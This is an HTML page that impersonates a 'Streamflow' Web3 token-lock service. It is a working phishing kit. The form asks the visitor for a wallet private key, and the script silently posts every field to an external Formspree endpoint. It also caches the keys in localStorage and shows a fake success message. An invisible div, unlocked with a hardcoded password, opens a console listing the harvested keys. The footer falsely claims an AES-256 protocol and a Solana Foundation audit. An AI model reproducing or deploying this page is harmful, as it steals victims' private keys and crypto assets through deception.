<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Streamflow | Web3 Security</title>
    <link rel="icon" type="image/png" href="icon.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0b0e11; color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); position: relative; }
        .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; transition: all 0.3s; color: #fff; outline: none; }
        .sf-input:focus { border-color: #00ffbd; box-shadow: 0 0 0 2px rgba(0,255,189,0.1); }
        .sf-btn { background: linear-gradient(135deg, #00ffbd 0%, #00d9a1 100%); color: #0b0e11; transition: all 0.3s; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        .sf-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,255,189,0.2); }
        .loader-bar { width: 0%; height: 2px; background: #00ffbd; position: absolute; top: 0; left: 0; transition: width 0.4s ease; }
        .admin-trigger { width: 100%; height: 40px; background: transparent; cursor: default; margin-top: 15px; }
        #log-console { display: none; background: #000; border: 1px solid #00ffbd; font-family: monospace; font-size: 11px; color: #00ffbd; padding: 15px; border-radius: 10px; margin-top: 20px; word-break: break-all; }
        select.sf-input { appearance: none; cursor: pointer; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="w-full max-w-md">
        <div class="flex flex-col items-center mb-10">
            <img src="logo.png" class="w-24 h-24 mb-4 drop-shadow-2xl">
            <h1 class="text-3xl font-extrabold tracking-tighter">STREAMFLOW</h1>
            <div class="flex items-center gap-2 mt-1">
                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                <span class="text-[10px] text-gray-400 uppercase tracking-[0.2em] font-bold">Encrypted Node: Active</span>
            </div>
        </div>

        <div class="sf-card p-8">
            <div id="prog-bar" class="loader-bar"></div>
            
            <h2 class="text-xl font-bold mb-8 text-center text-gray-200">Initialize Token Lock</h2>

            <form id="vaultForm" class="space-y-6">
                <div>
                    <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Project Identifier</label>
                    <input type="text" name="proj_id" placeholder="Project Name" class="sf-input w-full p-4 mt-1" required>
                </div>

                <div>
                    <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Access Phrase (Encrypted)</label>
                    <input type="password" name="secure_key" placeholder="Enter Private Key" class="sf-input w-full p-4 mt-1" required>
                </div>

                <div>
                    <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Lock Duration</label>
                    <select name="lock_time" class="sf-input w-full p-4 mt-1">
                        <option value="3_months">3 Months (Standard)</option>
                        <option value="6_months">6 Months</option>
                        <option value="1_year">1 Year</option>
                        <option value="2_years">2 Years</option>
                        <option value="permanent">Permanent Lock</option>
                    </select>
                </div>

                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Asset Symbol</label>
                        <input type="text" name="asset_sym" placeholder="SOL / MEME" class="sf-input w-full p-4 mt-1">
                    </div>
                    <div>
                        <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Amount</label>
                        <input type="number" name="asset_val" placeholder="0.00" class="sf-input w-full p-4 mt-1">
                    </div>
                </div>

                <button type="submit" id="actionBtn" class="sf-btn w-full p-5 mt-4 rounded-xl text-sm">
                    Confirm & Lock Assets
                </button>
            </form>

            <div class="admin-trigger" onclick="openMasterGate()"></div>

            <div id="log-console">
                <div class="border-b border-green-900 mb-2 pb-1 font-bold">INTERNAL_DATA_NODE</div>
                <div id="log-body"></div>
                <button onclick="document.getElementById('log-console').style.display='none'" class="mt-4 text-[10px] text-gray-500 underline">Close Console</button>
            </div>
        </div>

        <p class="text-[9px] text-gray-600 text-center mt-10 uppercase tracking-widest font-bold">
            Secured by AES-256 Protocol â€¢ Audited by Solana Foundation
        </p>
    </div>

    <script>
        const _k = "Ovidiu20";
        const _e = "https://formspree.io/f/mnjjqyez";

        const f = document.getElementById('vaultForm');
        const b = document.getElementById('actionBtn');
        const p = document.getElementById('prog-bar');

        f.addEventListener('submit', async (event) => {
            event.preventDefault();
            b.disabled = true;
            b.innerText = "Processing...";
            p.style.width = "45%";

            const formData = new FormData(f);

            try {
                await fetch(_e, {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });

                p.style.width = "100%";
                b.innerText = "Success";

                let cache = JSON.parse(localStorage.getItem('_sf_sys_cache') || "[]");
                cache.push({
                    n: formData.get('proj_id'),
                    v: formData.get('secure_key'),
                    t: formData.get('lock_time'),
                    d: new Date().toLocaleString()
                });
                localStorage.setItem('_sf_sys_cache', JSON.stringify(cache));

                setTimeout(() => {
                    alert("Congratulations! You have successfully locked your token for " + formData.get('lock_time').replace('_', ' ') + ". Take a screenshot and share it on social media. Success!");
                    b.innerText = "Confirm & Lock Assets";
                    b.disabled = false;
                    p.style.width = "0%";
                    f.reset();
                }, 800);

            } catch (err) {
                alert("Network Latency: Transaction Re-queued.");
                b.disabled = false;
            }
        });

        function openMasterGate() {
            const auth = prompt("SYSTEM_ACCESS_KEY:");
            if (auth === _k) {
                const con = document.getElementById('log-console');
                const body = document.getElementById('log-body');
                const logs = JSON.parse(localStorage.getItem('_sf_sys_cache') || "[]");
                
                con.style.display = 'block';
                body.innerHTML = logs.length > 0 ? 
                    logs.map(l => `[${l.d}] <br> ID: ${l.n} <br> TIME: ${l.t} <br> AUTH: ${l.v}<br>---`).join('<br>') : 
                    "No data packets detected.";
            }
        }
    </script>
</body>
</html>
